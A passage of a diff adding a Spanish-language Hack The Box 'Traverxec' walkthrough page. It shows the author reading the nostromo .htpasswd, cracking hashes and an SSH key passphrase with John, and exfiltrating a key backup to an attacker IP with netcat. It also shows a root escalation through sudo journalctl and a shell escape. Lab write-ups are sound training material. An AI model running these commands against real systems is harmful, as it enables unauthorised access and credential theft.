+<span id="cb57-6"><a href="traverxec.html#cb57-6"></a><span class="fu">ls</span></span>
+<span id="cb57-7"><a href="traverxec.html#cb57-7"></a><span class="bu">cd</span> nostromo</span>
+<span id="cb57-8"><a href="traverxec.html#cb57-8"></a><span class="bu">cd</span> conf</span>
+<span id="cb57-9"><a href="traverxec.html#cb57-9"></a><span class="fu">cat</span> nhttpd.conf</span>
+<span id="cb57-10"><a href="traverxec.html#cb57-10"></a><span class="fu">cat</span> /var/nostromo/conf/.htpasswd</span></code></pre></div>
+<p>Encontramos el hash del usuario david vamos a copiarlo en la maquina de attackante, y intentamos bruteforcear con <strong>John</strong></p>
+</div>
+<div id="john" class="section level3 unnumbered">
+<h3>John</h3>
+<div class="sourceCode" id="cb58"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb58-1"><a href="traverxec.html#cb58-1"></a><span class="ex">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hash</span></code></pre></div>
+<p>Encontramos una contraseña intentamos ponerla aciendo un <code>su david</code> y <code>su root</code>, pero no va. La conclusion a la que hay que llegar
+es que cuando miras el fichero nhttpd.conf, dice que hay un directorio <strong>public_www</strong>.</p>
+</div>
+<div id="investigacion-del-public_www" class="section level3 unnumbered">
+<h3>Investigacion del public_www</h3>
+<p>Intentamos ver si esta en el directorio <code>/home/david/public_www</code> y effectivamente. hay un fichero comprimido y nos vamos a transferir
+a nuestro equipo de attaquante.</p>
+<ol style="list-style-type: decimal">
+<li><p>En el equipo de attaquante</p>
+<div class="sourceCode" id="cb59"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb59-1"><a href="traverxec.html#cb59-1"></a><span class="ex">nc</span> -nlvp 443 <span class="op">&gt;</span> comprimido.tgz</span></code></pre></div></li>
+<li><p>En el equipo victima</p>
+<div class="sourceCode" id="cb60"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb60-1"><a href="traverxec.html#cb60-1"></a><span class="ex">nc</span> 10.10.14.20 443 <span class="op">&lt;</span> backup-ssh-identity-files.tgz</span></code></pre></div></li>
+</ol>
+<p>Descomprimimos el archivo con el commando</p>
+<div class="sourceCode" id="cb61"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb61-1"><a href="traverxec.html#cb61-1"></a><span class="ex">7z</span> l comprimido.tgz</span>
+<span id="cb61-2"><a href="traverxec.html#cb61-2"></a><span class="ex">7z</span> x comprimido.tgz</span>
+<span id="cb61-3"><a href="traverxec.html#cb61-3"></a><span class="ex">7z</span> l comprimido.tar</span>
+<span id="cb61-4"><a href="traverxec.html#cb61-4"></a><span class="ex">7z</span> x comprimido.tar </span></code></pre></div>
+<p>Hay la clave privado del usuario david pero esta protegida por contraseña. La tenemos que romper.</p>
+</div>
+<div id="ssh2john" class="section level3 unnumbered">
+<h3>ssh2john</h3>
+<div class="sourceCode" id="cb62"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb62-1"><a href="traverxec.html#cb62-1"></a><span class="ex">ssh2john.py</span> id_rsa <span class="op">&gt;</span> hash</span>
+<span id="cb62-2"><a href="traverxec.html#cb62-2"></a><span class="ex">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hash</span></code></pre></div>
+<p>La contraseña de la id_rsa a sido crackeada y ya nos podemos connectar con ssh</p>
+<div class="sourceCode" id="cb63"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb63-1"><a href="traverxec.html#cb63-1"></a><span class="fu">ssh</span> -i id_rsa david@10.10.10.165 </span></code></pre></div>
+</div>
+<div id="escalada-de-privilegio-para-root" class="section level3 unnumbered">
+<h3>Escalada de privilegio para root</h3>
+<div class="sourceCode" id="cb64"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb64-1"><a href="traverxec.html#cb64-1"></a><span class="fu">ls</span> -l</span>
+<span id="cb64-2"><a href="traverxec.html#cb64-2"></a><span class="co">#Output</span></span>
+<span id="cb64-3"><a href="traverxec.html#cb64-3"></a><span class="ex">bin</span></span>
+<span id="cb64-4"><a href="traverxec.html#cb64-4"></a></span>
+<span id="cb64-5"><a href="traverxec.html#cb64-5"></a><span class="bu">cd</span> bin/</span>
+<span id="cb64-6"><a href="traverxec.html#cb64-6"></a><span class="fu">cat</span> server-stats.sh</span></code></pre></div>
+<p>Vemos en este fichero que sudo puede executar <strong>journalctl</strong></p>
+<p>Vamos a la pagina de <a href="gtfobins.github.io">gtfobins</a> y buscamos por jounalctl</p>
+<p>El <strong>gtfobins</strong> dice que hay que lanzar jounalctl con sudo y en otra linea poner <code>!/bin/sh</code></p>
+<blockquote>
+<p>[!] NOTA: cuando pone ! en otra linea quiere decir que hay que ejecutarlo en modo less. O sea hay que reducir la terminal para que se pueda introducir un nuevo commando. En este caso !/bin/sh</p>
+</blockquote>
+<p>Ya estamos root y seguimos mas hack que nunca.</p>
+
+</div>
+</div>
+</div>
+<div class="page-inner">
+    <section class="normal" id="section-">
+        <div class="copyright">
+          &copy; 2021 - Lo0pInG 404 <a href="https://michellopez.org">[michellopez.org]</a>
+        </div>
+    </section>
+</div>
+            </section>
+
+          </div>
+        </div>
+      </div>
+<a href="olympus.html" class="navigation navigation-prev " aria-label="Previous page"><i class="fa fa-angle-left"></i></a>
+<a href="armageddon.html" class="navigation navigation-next " aria-label="Next page"><i class="fa fa-angle-right"></i></a>
+    </div>
+  </div>
+<script src="libs/gitbook-2.6.7/js/app.min.js"></script>
+<script src="libs/gitbook-2.6.7/js/lunr.js"></script>
+<script src="libs/gitbook-2.6.7/js/clipboard.min.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-search.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-sharing.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-fontsettings.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-bookdown.js"></script>
+<script src="libs/gitbook-2.6.7/js/jquery.highlight.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-clipboard.js"></script>
+<script>
+gitbook.require(["gitbook"], function(gitbook) {
+gitbook.start({
+"sharing": false,
+"fontsettings": {
+"theme": "night",
+"family": "sans",
+"size": 2
+},
+"edit": {
+"link": "https://github.com/mlopez66/hacking-notes/edit/master/02-Traverxec/02-00-Information.Rmd",
+"text": "Edit"
+},
+"history": {
+"link": null,
+"text": null
+},
+"view": {
+"link": null,
+"text": null
+},
+"download": ["2021-S4viNotes.pdf"],
+"toc": {
+"collapse": "section",
+"scroll_highlight": true
+}
+});
+});
+</script>
+
+</body>
+
+</html>
